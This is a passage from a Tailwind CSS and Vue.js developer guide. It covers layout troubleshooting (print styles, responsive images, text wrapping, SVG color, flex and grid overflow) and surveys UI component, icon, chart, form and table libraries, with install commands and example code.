<!-- Hide elements in print -->
<nav class="print:hidden">...</nav>
<button class="print:hidden">...</button>

<!-- Show only in print -->
<div class="hidden print:block">
  Page break info here
</div>

<!-- Adjust layout for print -->
<main class="max-w-4xl print:max-w-none print:mx-0">
  <article class="prose print:prose-sm">
    Content
  </article>
</main>

<!-- Force colors in print -->
<div class="bg-blue-500 text-white print:bg-blue-500 print:text-white"
     style="print-color-adjust: exact; -webkit-print-color-adjust: exact;">
  Prints with color
</div>

<!-- Page breaks -->
<div class="break-before-page">New page starts here</div>
<div class="break-after-page">Page break after this</div>
<div class="break-inside-avoid">Keep together</div>
```

```css
/* Custom print styles */
@media print {
  @page {
    margin: 1cm;
    size: A4;
  }

  body {
    font-size: 12pt;
    line-height: 1.5;
  }

  a[href]::after {
    content: " (" attr(href) ")";
    font-size: 0.8em;
  }
}
```

**Prevention:**
- Add `print:` variants to critical elements
- Test print preview regularly
- Hide interactive elements in print

### Problem 14: Responsive Images Not Sharp on Retina

**Symptoms:**
- Images look blurry on high-DPI screens
- Different sharpness on different devices
- Retina displays show pixelation

**Cause:**
- Image resolution too low for display density
- Missing srcset
- Wrong image sizes

**Solution:**
```html
<!-- ✅ GOOD - Responsive images with srcset -->
<img
  src="image-800.jpg"
  srcset="
    image-400.jpg 400w,
    image-800.jpg 800w,
    image-1200.jpg 1200w,
    image-1600.jpg 1600w
  "
  sizes="
    (max-width: 640px) 100vw,
    (max-width: 1024px) 50vw,
    33vw
  "
  class="w-full h-auto"
  loading="lazy"
  decoding="async"
  alt="Description"
/>

<!-- ✅ GOOD - For logos/icons, use 2x images -->
<img
  src="logo@2x.png"
  class="w-32 h-auto"
  alt="Logo"
/>

<!-- ✅ GOOD - Use SVG when possible -->
<img src="icon.svg" class="w-6 h-6" alt="" />

<!-- Or inline SVG for styling -->
<svg class="w-6 h-6 text-primary-500" fill="currentColor">...</svg>
```

**Prevention:**
- Use srcset for all content images
- Provide 2x versions for fixed-size images
- Prefer SVG for icons and logos

### Problem 15: Text Wrapping Breaking Design

**Symptoms:**
- Single words on new lines (orphans)
- Headlines breaking awkwardly
- Long words overflow containers

**Cause:**
- No text wrapping control
- Missing word-break handling
- Container too narrow for content

**Solution:**
```html
<!-- ✅ GOOD - Balanced headlines -->
<h1 class="text-4xl font-bold text-balance">
  This headline will wrap in a balanced way
</h1>

<!-- ✅ GOOD - Prevent orphans -->
<p class="text-pretty">
  This paragraph text will avoid orphans at the end.
</p>

<!-- ✅ GOOD - Handle long words/URLs -->
<p class="break-words">
  Superlongwordthatwouldnormallyoverflow
</p>

<!-- ✅ GOOD - Truncate with ellipsis -->
<p class="truncate">
  Long text that will be truncated...
</p>

<!-- ✅ GOOD - Multi-line truncation -->
<p class="line-clamp-3">
  Long text that will show maximum 3 lines then truncate with ellipsis.
  This is additional text that won't show.
</p>

<!-- ✅ GOOD - No-wrap for specific content -->
<span class="whitespace-nowrap">
  Don't break this: 555-123-4567
</span>

<!-- ✅ GOOD - Hyphenation for justified text -->
<p class="text-justify hyphens-auto">
  Justified text with automatic hyphenation for better appearance.
</p>
```

**Prevention:**
- Use `text-balance` for headlines
- Use `text-pretty` for body text
- Handle long content with `break-words`

### Problem 16: SVG Icons Not Inheriting Color

**Symptoms:**
- Icon stays same color despite class
- `text-*` classes don't work on SVG
- Fill color stuck

**Cause:**
- SVG has hardcoded fill/stroke
- Not using `currentColor`
- Wrong attribute targeted

**Solution:**
```html
<!-- ❌ BAD - Hardcoded color -->
<svg fill="#000000" class="text-red-500">...</svg>

<!-- ✅ GOOD - Uses currentColor -->
<svg fill="currentColor" class="w-5 h-5 text-red-500">
  <path d="..." />
</svg>

<!-- ✅ GOOD - For stroke-based icons -->
<svg
  fill="none"
  stroke="currentColor"
  stroke-width="2"
  class="w-5 h-5 text-gray-500"
>
  <path d="..." />
</svg>

<!-- ✅ GOOD - Clean SVG setup -->
<svg
  class="w-6 h-6 text-primary-500 hover:text-primary-700 transition-colors"
  fill="currentColor"
  viewBox="0 0 24 24"
  aria-hidden="true"
>
  <path d="..." />
</svg>

<!-- When importing SVGs -->
<!-- Make sure to replace fill="#..." with fill="currentColor" -->
```

**Prevention:**
- Always use `currentColor` for fill/stroke
- Remove hardcoded colors from SVGs
- Check SVG source before importing

### Problem 17: Flexbox Items Overflowing Container

**Symptoms:**
- Flex items extend beyond parent
- Horizontal scroll appears
- Container doesn't constrain children

**Cause:**
- Missing `min-w-0` on flex items
- Content forcing minimum width
- No `overflow` handling

**Solution:**
```html
<!-- ❌ BAD - Content overflows -->
<div class="flex">
  <div class="flex-1">
    <p>This very long text will cause overflow issues...</p>
  </div>
</div>

<!-- ✅ GOOD - min-w-0 allows shrinking -->
<div class="flex">
  <div class="flex-1 min-w-0">
    <p class="truncate">This text will truncate properly</p>
  </div>
</div>

<!-- ✅ GOOD - With overflow handling -->
<div class="flex gap-4">
  <div class="flex-shrink-0 w-16">
    <img src="..." class="w-full" />
  </div>
  <div class="flex-1 min-w-0 overflow-hidden">
    <p class="truncate">Long text that truncates</p>
  </div>
</div>

<!-- ✅ GOOD - For scrollable content -->
<div class="flex h-screen">
  <aside class="w-64 flex-shrink-0">Sidebar</aside>
  <main class="flex-1 min-w-0 overflow-auto">
    Scrollable main content
  </main>
</div>
```

**Prevention:**
- Add `min-w-0` to flex items that can shrink
- Use `flex-shrink-0` for fixed-size items
- Handle overflow explicitly

### Problem 18: CSS Grid Items Not Filling Cell

**Symptoms:**
- Grid items smaller than cells
- Unexpected alignment
- Items don't stretch

**Cause:**
- Default alignment settings
- Item has intrinsic size
- Missing stretch alignment

**Solution:**
```html
<!-- ❌ BAD - Items don't fill cells -->
<div class="grid grid-cols-3 gap-4">
  <div>Small content</div>
  <div>Medium content here</div>
  <div>Even more content in this cell</div>
</div>

<!-- ✅ GOOD - Items stretch to fill -->
<div class="grid grid-cols-3 gap-4 items-stretch">
  <div class="h-full">Fills cell height</div>
  <div class="h-full">Fills cell height</div>
  <div class="h-full">Fills cell height</div>
</div>

<!-- ✅ GOOD - Cards with equal height -->
<div class="grid grid-cols-3 gap-4">
  <div class="flex flex-col bg-white p-4 rounded-lg">
    <h3>Title</h3>
    <p class="flex-1">Content</p>
    <button class="mt-auto">Action</button>
  </div>
  <!-- Repeat for other cards -->
</div>

<!-- ✅ GOOD - Explicit placement -->
<div class="grid grid-cols-3 gap-4 auto-rows-fr">
  <!-- auto-rows-fr makes all rows equal height -->
  <div>Content</div>
</div>
```

**Prevention:**
- Use `items-stretch` (default) for full-height items
- Combine grid with flexbox for complex layouts
- Use `auto-rows-fr` for equal row heights

## UI Libraries and Component Systems

This section provides comprehensive guidance on UI component libraries, pre-built blocks, and design systems that work with Tailwind CSS and Vue.js.

### Library Selection Guide

#### Decision Matrix for Vue.js + Tailwind Projects

| Library | Best For | Styling | Accessibility | Bundle Size | Learning Curve |
|---------|----------|---------|---------------|-------------|----------------|
| HeadlessUI | Unstyled, full control | None (BYO) | Excellent | ~20KB | Low |
| Shadcn/ui | Copy-paste components | Tailwind | Good | 0 (source) | Low |
| Radix Vue | Unstyled primitives | None (BYO) | Excellent | ~15KB | Medium |
| PrimeVue | Enterprise apps | Tailwind themes | Good | ~200KB | Medium |
| Vuetify | Material Design | Built-in | Good | ~300KB | Medium |
| Naive UI | Feature-rich | CSS vars | Good | ~150KB | Medium |
| Element Plus | Enterprise/Admin | Built-in | Fair | ~400KB | Low |
| DaisyUI | Rapid prototyping | Tailwind | Fair | ~30KB | Very Low |
| Flowbite Vue | Marketing sites | Tailwind | Good | ~50KB | Low |

### Headless UI Libraries (Unstyled)

#### HeadlessUI (Recommended for Vue + Tailwind)

**Overview:** Official Tailwind Labs library providing completely unstyled, accessible UI components.

**Installation:**
```bash
npm install @headlessui/vue
```

**Key Components:**
- `Dialog` - Modal dialogs with focus trapping
- `Disclosure` - Collapsible sections/accordions
- `Listbox` - Custom select dropdowns
- `Combobox` - Searchable select with autocomplete
- `Menu` - Dropdown menus
- `Popover` - Tooltips and popovers
- `RadioGroup` - Custom radio buttons
- `Switch` - Toggle switches
- `Tabs` - Tab panels
- `Transition` - Enter/leave animations

**Example - Dialog:**
```vue
<script setup>
import { ref } from 'vue';
import {
  Dialog,
  DialogPanel,
  DialogTitle,
  TransitionChild,
  TransitionRoot,
} from '@headlessui/vue';

const isOpen = ref(false);
</script>

<template>
  <TransitionRoot appear :show="isOpen" as="template">
    <Dialog as="div" class="relative z-50" @close="isOpen = false">
      <TransitionChild
        enter="duration-300 ease-out"
        enter-from="opacity-0"
        enter-to="opacity-100"
        leave="duration-200 ease-in"
        leave-from="opacity-100"
        leave-to="opacity-0"
      >
        <div class="fixed inset-0 bg-black/25" />
      </TransitionChild>

      <div class="fixed inset-0 overflow-y-auto">
        <div class="flex min-h-full items-center justify-center p-4">
          <TransitionChild
            enter="duration-300 ease-out"
            enter-from="opacity-0 scale-95"
            enter-to="opacity-100 scale-100"
            leave="duration-200 ease-in"
            leave-from="opacity-100 scale-100"
            leave-to="opacity-0 scale-95"
          >
            <DialogPanel class="w-full max-w-md rounded-2xl bg-white p-6 shadow-xl">
              <DialogTitle class="text-lg font-medium text-gray-900">
                Dialog Title
              </DialogTitle>
              <p class="mt-2 text-sm text-gray-500">
                Dialog content goes here.
              </p>
              <button
                class="mt-4 px-4 py-2 bg-primary-600 text-white rounded-lg"
                @click="isOpen = false"
              >
                Close
              </button>
            </DialogPanel>
          </TransitionChild>
        </div>
      </div>
    </Dialog>
  </TransitionRoot>
</template>
```

**Example - Combobox (Searchable Select):**
```vue
<script setup>
import { ref, computed } from 'vue';
import {
  Combobox,
  ComboboxInput,
  ComboboxButton,
  ComboboxOptions,
  ComboboxOption,
} from '@headlessui/vue';

const people = [
  { id: 1, name: 'Wade Cooper' },
  { id: 2, name: 'Arlene Mccoy' },
  { id: 3, name: 'Devon Webb' },
];

const selected = ref(people[0]);
const query = ref('');

const filteredPeople = computed(() =>
  query.value === ''
    ? people
    : people.filter((person) =>
        person.name.toLowerCase().includes(query.value.toLowerCase())
      )
);
</script>

<template>
  <Combobox v-model="selected">
    <div class="relative">
      <ComboboxInput
        class="w-full rounded-lg border border-gray-300 py-2 pl-3 pr-10"
        :displayValue="(person) => person?.name"
        @change="query = $event.target.value"
      />
      <ComboboxButton class="absolute inset-y-0 right-0 flex items-center pr-2">
        <ChevronDownIcon class="h-5 w-5 text-gray-400" />
      </ComboboxButton>

      <ComboboxOptions class="absolute mt-1 max-h-60 w-full overflow-auto rounded-md bg-white py-1 shadow-lg">
        <ComboboxOption
          v-for="person in filteredPeople"
          :key="person.id"
          :value="person"
          v-slot="{ active, selected }"
          class="relative cursor-pointer select-none py-2 pl-10 pr-4"
          :class="{ 'bg-primary-600 text-white': active }"
        >
          <span :class="{ 'font-medium': selected }">{{ person.name }}</span>
        </ComboboxOption>
      </ComboboxOptions>
    </div>
  </Combobox>
</template>
```

#### Radix Vue

**Overview:** Vue port of Radix UI primitives - low-level, unstyled, accessible components.

**Installation:**
```bash
npm install radix-vue
```

**Key Components:**
- Accordion, Alert Dialog, Avatar, Checkbox
- Collapsible, Context Menu, Dialog, Dropdown Menu
- Hover Card, Label, Menubar, Navigation Menu
- Popover, Progress, Radio Group, Scroll Area
- Select, Separator, Slider, Switch
- Tabs, Toast, Toggle, Toggle Group, Tooltip

**Example - Select:**
```vue
<script setup>
import {
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectItemIndicator,
  SelectItemText,
  SelectLabel,
  SelectPortal,
  SelectRoot,
  SelectScrollDownButton,
  SelectScrollUpButton,
  SelectTrigger,
  SelectValue,
  SelectViewport,
} from 'radix-vue';
</script>

<template>
  <SelectRoot>
    <SelectTrigger
      class="inline-flex items-center justify-between rounded-lg px-4 py-2 border"
    >
      <SelectValue placeholder="Select an option" />
    </SelectTrigger>

    <SelectPortal>
      <SelectContent class="bg-white rounded-lg shadow-lg border p-1">
        <SelectViewport>
          <SelectGroup>
            <SelectLabel class="px-2 py-1 text-sm text-gray-500">Fruits</SelectLabel>
            <SelectItem value="apple" class="px-2 py-1 rounded hover:bg-gray-100 cursor-pointer">
              <SelectItemText>Apple</SelectItemText>
            </SelectItem>
            <SelectItem value="banana" class="px-2 py-1 rounded hover:bg-gray-100 cursor-pointer">
              <SelectItemText>Banana</SelectItemText>
            </SelectItem>
          </SelectGroup>
        </SelectViewport>
      </SelectContent>
    </SelectPortal>
  </SelectRoot>
</template>
```

### Copy-Paste Component Libraries

#### Shadcn/ui for Vue (shadcn-vue)

**Overview:** NOT a component library - it's a collection of re-usable components you copy into your project. Built on Radix Vue and Tailwind CSS.

**Installation:**
```bash
npx shadcn-vue@latest init
```

**Configuration (components.json):**
```json
{
  "$schema": "https://shadcn-vue.com/schema.json",
  "style": "default",
  "tailwind": {
    "config": "tailwind.config.js",
    "css": "resources/css/app.css",
    "baseColor": "slate",
    "cssVariables": true
  },
  "typescript": true,
  "framework": "vite",
  "aliases": {
    "components": "@/Components",
    "utils": "@/lib/utils"
  }
}
```

**Adding Components:**
```bash
# Add individual components
npx shadcn-vue@latest add button
npx shadcn-vue@latest add card
npx shadcn-vue@latest add dialog
npx shadcn-vue@latest add dropdown-menu
npx shadcn-vue@latest add form
npx shadcn-vue@latest add input
npx shadcn-vue@latest add select
npx shadcn-vue@latest add table
npx shadcn-vue@latest add tabs
npx shadcn-vue@latest add toast

# Add multiple components
npx shadcn-vue@latest add button card input label
```

**Available Components (50+):**
- **Layout:** Accordion, AspectRatio, Card, Collapsible, Resizable, ScrollArea, Separator
- **Forms:** Button, Checkbox, Form, Input, Label, RadioGroup, Select, Slider, Switch, Textarea, Toggle
- **Data Display:** Avatar, Badge, Calendar, DataTable, Table
- **Feedback:** Alert, AlertDialog, Progress, Skeleton, Sonner (Toast), Toast
- **Navigation:** Breadcrumb, Command, ContextMenu, DropdownMenu, Menubar, NavigationMenu, Pagination, Tabs
- **Overlay:** Dialog, Drawer, HoverCard, Popover, Sheet, Tooltip
- **Date/Time:** Calendar, DatePicker, RangePicker

**Example Usage:**
```vue
<script setup>
import { Button } from '@/Components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/Components/ui/card';
import { Input } from '@/Components/ui/input';
import { Label } from '@/Components/ui/label';
</script>

<template>
  <Card class="w-[350px]">
    <CardHeader>
      <CardTitle>Create Invoice</CardTitle>
    </CardHeader>
    <CardContent>
      <form class="space-y-4">
        <div class="space-y-2">
          <Label for="name">Client Name</Label>
          <Input id="name" placeholder="Enter client name" />
        </div>
        <Button type="submit" class="w-full">Create</Button>
      </form>
    </CardContent>
  </Card>
</template>
```

**Why Shadcn-vue:**
- Full ownership of code - no external dependencies
- Fully customizable - modify any component
- Type-safe with TypeScript
- Accessible by default (Radix primitives)
- Works perfectly with Laravel Inertia

### Tailwind Component Plugins

#### DaisyUI

**Overview:** Tailwind CSS component library that adds semantic class names for common components.

**Installation:**
```bash
npm install daisyui
```

**Configuration:**
```javascript
// tailwind.config.js
module.exports = {
  plugins: [require('daisyui')],
  daisyui: {
    themes: ['light', 'dark', 'corporate', 'business'],
    darkTheme: 'dark',
    base: true,
    styled: true,
    utils: true,
    logs: false,
  },
}
```

**Components (50+):**
- **Actions:** Button, Dropdown, Modal, Swap, Theme Controller
- **Data Display:** Accordion, Avatar, Badge, Card, Carousel, Chat Bubble, Collapse, Countdown, Diff, Kbd, Stat, Table, Timeline
- **Data Input:** Checkbox, File Input, Radio, Range, Rating, Select, Text Input, Textarea, Toggle
- **Layout:** Artboard, Divider, Drawer, Footer, Hero, Indicator, Join, Mask, Stack
- **Navigation:** Breadcrumbs, Bottom Nav, Link, Menu, Navbar, Pagination, Steps, Tab
- **Feedback:** Alert, Loading, Progress, Radial Progress, Skeleton, Toast, Tooltip

**Example Usage:**
```html
<!-- Buttons with semantic classes -->
<button class="btn btn-primary">Primary</button>
<button class="btn btn-secondary">Secondary</button>
<button class="btn btn-accent">Accent</button>
<button class="btn btn-ghost">Ghost</button>
<button class="btn btn-link">Link</button>

<!-- Card -->
<div class="card w-96 bg-base-100 shadow-xl">
  <figure><img src="..." alt="Image" /></figure>
  <div class="card-body">
    <h2 class="card-title">Card Title</h2>
    <p>Card content goes here</p>
    <div class="card-actions justify-end">
      <button class="btn btn-primary">Action</button>
    </div>
  </div>
</div>

<!-- Modal -->
<button class="btn" onclick="my_modal.showModal()">Open Modal</button>
<dialog id="my_modal" class="modal">
  <div class="modal-box">
    <h3 class="font-bold text-lg">Hello!</h3>
    <p class="py-4">Modal content</p>
    <div class="modal-action">
      <form method="dialog">
        <button class="btn">Close</button>
      </form>
    </div>
  </div>
</dialog>

<!-- Table -->
<div class="overflow-x-auto">
  <table class="table table-zebra">
    <thead>
      <tr>
        <th>Name</th>
        <th>Email</th>
        <th>Status</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>John Doe</td>
        <td>john@example.com</td>
        <td><span class="badge badge-success">Active</span></td>
      </tr>
    </tbody>
  </table>
</div>
```

#### Flowbite / Flowbite Vue

**Overview:** Tailwind CSS component library with Vue components and vanilla JS.

**Installation:**
```bash
npm install flowbite flowbite-vue
```

**Configuration:**
```javascript
// tailwind.config.js
module.exports = {
  content: [
    './node_modules/flowbite-vue/**/*.{js,jsx,ts,tsx,vue}',
    './node_modules/flowbite/**/*.{js,jsx,ts,tsx}',
  ],
  plugins: [require('flowbite/plugin')],
}
```

**Components:**
- Accordion, Alert, Avatar, Badge, Banner, Breadcrumb
- Button, Button Group, Card, Carousel, Clipboard
- Datepicker, Drawer, Dropdown, File Input, Footer
- Forms, Gallery, Indicators, Input Field, Jumbotron
- KBD, List Group, Mega Menu, Modal, Navbar, Pagination
- Popover, Progress, Rating, Sidebar, Skeleton, Speed Dial
- Spinner, Stepper, Table, Tabs, Timeline, Toast, Tooltip, Typography

**Example:**
```vue
<script setup>
import { FwbButton, FwbModal, FwbInput } from 'flowbite-vue';

const isShowModal = ref(false);
</script>

<template>
  <FwbButton @click="isShowModal = true">Open Modal</FwbButton>

  <FwbModal v-if="isShowModal" @close="isShowModal = false">
    <template #header>
      <h3>Modal Title</h3>
    </template>
    <template #body>
      <FwbInput v-model="value" label="Name" placeholder="Enter name" />
    </template>
    <template #footer>
      <FwbButton @click="isShowModal = false">Save</FwbButton>
    </template>
  </FwbModal>
</template>
```

#### Preline UI

**Overview:** Open-source set of prebuilt UI components based on Tailwind CSS.

**Installation:**
```bash
npm install preline
```

**Configuration:**
```javascript
// tailwind.config.js
module.exports = {
  content: [
    './node_modules/preline/dist/*.js',
  ],
  plugins: [require('preline/plugin')],
}
```

**Components:**
- Accordion, Alerts, Avatars, Badges, Breadcrumbs
- Buttons, Cards, Carousels, Checkboxes, Chips
- Collapse, Datepickers, Dropdowns, File Inputs
- Input Groups, Inputs, Legends, Links, Lists
- Mega Menu, Modals, Navbars, Pagination, Pins
- Popovers, Progress, Radio, Ratings, Search
- Select, Sidebars, Sliders, Spinners, Stats
- Steppers, Strong Password, Switches, Tables
- Tabs, Textareas, Timelines, Toasts, Toggles
- Tooltips, Tree Views

**Example:**
```html
<!-- Preline Dropdown -->
<div class="hs-dropdown relative inline-flex">
  <button type="button" class="hs-dropdown-toggle py-3 px-4 inline-flex items-center gap-x-2 text-sm font-medium rounded-lg border border-gray-200 bg-white text-gray-800 shadow-sm hover:bg-gray-50">
    Actions
    <svg class="hs-dropdown-open:rotate-180 size-4" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="m6 9 6 6 6-6"/>
    </svg>
  </button>

  <div class="hs-dropdown-menu transition-[opacity,margin] duration hs-dropdown-open:opacity-100 opacity-0 hidden min-w-60 bg-white shadow-md rounded-lg p-2 mt-2">
    <a class="flex items-center gap-x-3.5 py-2 px-3 rounded-lg text-sm text-gray-800 hover:bg-gray-100" href="#">
      Edit
    </a>
    <a class="flex items-center gap-x-3.5 py-2 px-3 rounded-lg text-sm text-gray-800 hover:bg-gray-100" href="#">
      Delete
    </a>
  </div>
</div>
```

### Full-Featured Vue UI Libraries

#### PrimeVue

**Overview:** Rich set of 90+ Vue UI components with multiple theme options including Tailwind.

**Installation:**
```bash
npm install primevue
npm install @primevue/themes  # For Tailwind theme
```

**Configuration:**
```javascript
// main.js
import { createApp } from 'vue';
import PrimeVue from 'primevue/config';
import Aura from '@primevue/themes/aura';

const app = createApp(App);
app.use(PrimeVue, {
  theme: {
    preset: Aura,
    options: {
      darkModeSelector: '.dark',
    }
  }
});
```

**Components (90+):**
- **Form:** AutoComplete, Calendar, CascadeSelect, Checkbox, Chips, ColorPicker, Dropdown, Editor, InputGroup, InputMask, InputNumber, InputOtp, InputSwitch, InputText, Knob, Listbox, MultiSelect, Password, RadioButton, Rating, SelectButton, Slider, Textarea, ToggleButton, TreeSelect
- **Data:** DataTable, DataView, OrderList, OrgChart, Paginator, PickList, Timeline, Tree, TreeTable, VirtualScroller
- **Panel:** Accordion, Card, Deferred, Divider, Fieldset, Panel, ScrollPanel, Splitter, Stepper, TabView, Toolbar
- **Overlay:** ConfirmDialog, ConfirmPopup, Dialog, DynamicDialog, OverlayPanel, Sidebar, Tooltip
- **File:** FileUpload
- **Menu:** Breadcrumb, ContextMenu, Dock, MegaMenu, Menu, Menubar, PanelMenu, SpeedDial, Steps, TabMenu, TieredMenu
- **Messages:** Message, Toast, InlineMessage
- **Media:** Carousel, Galleria, Image
- **Misc:** Avatar, Badge, BlockUI, Chip, Inplace, MeterGroup, ProgressBar, ProgressSpinner, ScrollTop, Skeleton, Tag, Terminal

**Example:**
```vue
<script setup>
import DataTable from 'primevue/datatable';
import Column from 'primevue/column';
import Button from 'primevue/button';

const products = ref([]);
</script>

<template>
  <DataTable :value="products" paginator :rows="10" tableStyle="min-width: 50rem">
    <Column field="name" header="Name" sortable></Column>
    <Column field="price" header="Price" sortable>
      <template #body="{ data }">
        {{ formatCurrency(data.price) }}
      </template>
    </Column>
    <Column header="Actions">
      <template #body="{ data }">
        <Button icon="pi pi-pencil" class="mr-2" @click="edit(data)" />
        <Button icon="pi pi-trash" severity="danger" @click="remove(data)" />
      </template>
    </Column>
  </DataTable>
</template>
```

#### Naive UI

**Overview:** Vue 3 component library with TypeScript, customizable themes, and tree-shakable.

**Installation:**
```bash
npm install naive-ui
npm install -D vfonts  # Optional icon fonts
```

**Components (80+):**
- Form components, data tables, tree views, date pickers
- Modals, drawers, notifications, messages
- Upload, transfer, color picker, mentions
- Excellent TypeScript support
- CSS variable-based theming (compatible with Tailwind)

**Example:**
```vue
<script setup>
import { NButton, NCard, NSpace, NDataTable } from 'naive-ui';
</script>

<template>
  <NCard title="Card Title" class="max-w-md">
    <NSpace vertical>
      <NButton type="primary">Primary</NButton>
      <NButton type="info">Info</NButton>
    </NSpace>
  </NCard>
</template>
```

#### Vuetify 3

**Overview:** Material Design component framework for Vue.

**Installation:**
```bash
npm install vuetify
```

**Note:** Vuetify has its own styling system. For Tailwind projects, consider if Material Design aesthetic is desired.

#### Element Plus

**Overview:** Vue 3 UI library for enterprise applications.

**Installation:**
```bash
npm install element-plus
```

**Features:**
- 70+ components
- i18n support
- SSR compatible
- Theme customization

### Pre-Built Blocks and Templates

#### Tailwind UI (Official - Paid)

**Overview:** Official Tailwind CSS component library by Tailwind Labs.

**Categories:**
- **Marketing:** Hero sections, feature sections, CTAs, pricing, testimonials, FAQs, footers, headers
- **Application UI:** Stacked layouts, sidebar layouts, multi-column layouts, form layouts, tables, lists, description lists, stats, charts
- **Ecommerce:** Product overviews, product lists, category filters, shopping carts, checkout forms, order history

**Integration:** Copy HTML directly, works with any framework.

#### Tailwind Components (Free Resources)

**Tailwind Elements:**
```bash
npm install tw-elements
```
500+ components, blocks, and templates.

**Meraki UI:**
Free Tailwind CSS components: https://merakiui.com
- Alerts, Buttons, Cards, Dropdowns, Forms, Modals, Navbars, etc.

**HyperUI:**
Free Tailwind CSS components: https://hyperui.dev
- Marketing components, ecommerce, application UI

**Kutty:**
Tailwind plugin with components:
```bash
npm install kutty
```

**Sailboat UI:**
Modern UI components for Tailwind: https://sailboatui.com

**Windstatic:**
Free Tailwind CSS components: https://windstatic.com

#### Block Collections for Specific Use Cases

**Admin Dashboards:**
- Tailwind Toolbox - Admin templates
- Windmill Dashboard
- Mosaic Lite

**E-commerce:**
- Tailwind Starter Kit
- Flavor (headless commerce components)

**Landing Pages:**
- Tailblocks - 60+ ready-to-use blocks
- Treact - Marketing website templates

### Icon Libraries

#### Heroicons (Recommended)

**Overview:** Official icon set from Tailwind Labs.

**Installation:**
```bash
npm install @heroicons/vue
```

**Usage:**
```vue
<script setup>
import { BeakerIcon, ChartBarIcon } from '@heroicons/vue/24/solid';
import { BeakerIcon as BeakerOutline } from '@heroicons/vue/24/outline';
</script>

<template>
  <BeakerIcon class="h-6 w-6 text-blue-500" />
  <BeakerOutline class="h-6 w-6 text-gray-400" />
</template>
```

**Variants:**
- `@heroicons/vue/24/solid` - Filled icons (24x24)
- `@heroicons/vue/24/outline` - Outlined icons (24x24)
- `@heroicons/vue/20/solid` - Smaller solid icons (20x20)
- `@heroicons/vue/16/solid` - Mini icons (16x16)

#### Lucide Icons

**Installation:**
```bash
npm install lucide-vue-next
```

**Usage:**
```vue
<script setup>
import { Home, Settings, User } from 'lucide-vue-next';
</script>

<template>
  <Home class="w-5 h-5" />
  <Settings class="w-5 h-5 text-gray-500" />
</template>
```

#### Phosphor Icons

**Installation:**
```bash
npm install @phosphor-icons/vue
```

**Features:** 6 weights (thin, light, regular, bold, fill, duotone), 1,200+ icons.

#### Tabler Icons

**Installation:**
```bash
npm install @tabler/icons-vue
```

**Features:** 4,500+ free SVG icons.

#### Iconify (Universal)

**Installation:**
```bash
npm install @iconify/vue
```

**Usage:**
```vue
<script setup>
import { Icon } from '@iconify/vue';
</script>

<template>
  <!-- Access 150,000+ icons from 100+ icon sets -->
  <Icon icon="mdi:home" class="w-6 h-6" />
  <Icon icon="fa6-solid:user" class="w-6 h-6" />
  <Icon icon="heroicons:beaker-solid" class="w-6 h-6" />
</template>
```

### Animation Libraries

#### Auto-Animate

**Installation:**
```bash
npm install @formkit/auto-animate
```

**Usage:**
```vue
<script setup>
import { useAutoAnimate } from '@formkit/auto-animate/vue';

const [parent] = useAutoAnimate();
</script>

<template>
  <ul ref="parent">
    <li v-for="item in items" :key="item.id">{{ item.name }}</li>
  </ul>
</template>
```

#### Motion One / @vueuse/motion

**Installation:**
```bash
npm install @vueuse/motion
```

**Usage:**
```vue
<script setup>
import { Motion } from '@vueuse/motion';
</script>

<template>
  <Motion
    :initial="{ opacity: 0, y: 100 }"
    :enter="{ opacity: 1, y: 0 }"
  >
    <div>Animated content</div>
  </Motion>
</template>
```

### Chart Libraries

#### Chart.js with vue-chartjs

**Installation:**
```bash
npm install chart.js vue-chartjs
```

**Usage:**
```vue
<script setup>
import { Bar } from 'vue-chartjs';
import { Chart as ChartJS, CategoryScale, LinearScale, BarElement } from 'chart.js';

ChartJS.register(CategoryScale, LinearScale, BarElement);

const data = {
  labels: ['Jan', 'Feb', 'Mar'],
  datasets: [{ data: [40, 20, 30], backgroundColor: '#3b82f6' }]
};
</script>

<template>
  <Bar :data="data" />
</template>
```

#### Apache ECharts

**Installation:**
```bash
npm install echarts vue-echarts
```

**Features:** Rich visualization options, large dataset support.

#### ApexCharts

**Installation:**
```bash
npm install apexcharts vue3-apexcharts
```

**Features:** Modern, interactive charts with excellent defaults.

### Form Libraries

#### VeeValidate + Zod

**Installation:**
```bash
npm install vee-validate @vee-validate/zod zod
```

**Usage:**
```vue
<script setup>
import { useForm } from 'vee-validate';
import { toTypedSchema } from '@vee-validate/zod';
import * as z from 'zod';

const schema = toTypedSchema(
  z.object({
    email: z.string().email(),
    password: z.string().min(8),
  })
);

const { handleSubmit, errors } = useForm({ validationSchema: schema });

const onSubmit = handleSubmit((values) => {
  console.log(values);
});
</script>

<template>
  <form @submit="onSubmit">
    <input v-model="email" name="email" />
    <span class="text-red-500">{{ errors.email }}</span>
    <!-- ... -->
  </form>
</template>
```

#### FormKit

**Installation:**
```bash
npm install @formkit/vue @formkit/themes
```

**Features:**
- Schema-driven forms
- Built-in validation
- Tailwind CSS theme
- Input masking

### Date/Time Libraries

#### VueDatePicker

**Installation:**
```bash
npm install @vuepic/vue-datepicker
```

**Features:**
- Date, time, date-time, range pickers
- Tailwind CSS styling
- Dark mode support

#### Day.js (Lightweight)

**Installation:**
```bash
npm install dayjs
```

### Table Libraries

#### TanStack Table (Headless)

**Installation:**
```bash
npm install @tanstack/vue-table
```

**Features:**
- Headless - you control the styling
- Sorting, filtering, pagination, grouping
- Virtual scrolling for large datasets
- Column resizing, reordering

**Example:**
```vue
<script setup>
import { useVueTable, getCoreRowModel, flexRender } from '@tanstack/vue-table';

const columns = [
  { accessorKey: 'name', header: 'Name' },
  { accessorKey: 'email', header: 'Email' },
];

const table = useVueTable({
  data: invoices,
  columns,
  getCoreRowModel: getCoreRowModel(),
});
</script>

<template>
  <table class="min-w-full divide-y divide-gray-200">
    <thead class="bg-gray-50">
      <tr v-for="headerGroup in table.getHeaderGroups()" :key="headerGroup.id">
        <th v-for="header in headerGroup.headers" :key="header.id" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">
          <FlexRender :render="header.column.columnDef.header" :props="header.getContext()" />
        </th>
      </tr>
    </thead>
    <tbody class="bg-white divide-y divide-gray-200">
      <tr v-for="row in table.getRowModel().rows" :key="row.id">
        <td v-for="cell in row.getVisibleCells()" :key="cell.id" class="px-6 py-4 whitespace-nowrap">
          <FlexRender :render="cell.column.columnDef.cell" :props="cell.getContext()" />
        </td>
      </tr>
    </tbody>
  </table>
</template>
```

### Utility Libraries

#### VueUse

